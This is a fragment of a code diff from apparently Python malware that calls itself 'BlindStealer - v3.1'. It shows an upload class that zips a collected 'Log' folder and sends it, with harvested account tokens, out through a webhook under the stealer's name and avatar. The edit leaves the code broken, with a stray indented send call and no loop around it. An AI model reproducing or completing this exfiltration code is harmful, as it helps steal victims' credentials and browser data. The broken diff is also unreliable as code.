@@ -64,7 +64,6 @@ class Upload:
                 title="New log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
                 color=0x24262A,
-                username="BlindStealer - v3.1",
             ),
             file=File("Log.zip"),
         )
@@ -97,8 +96,7 @@ class Upload:
         if not self.tokens:
             return
 
-        for token in self.tokens:
-            username = user['username'] + '#' + user['discriminator']
+            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
 
 class Chromium:
     def __init__(self): 
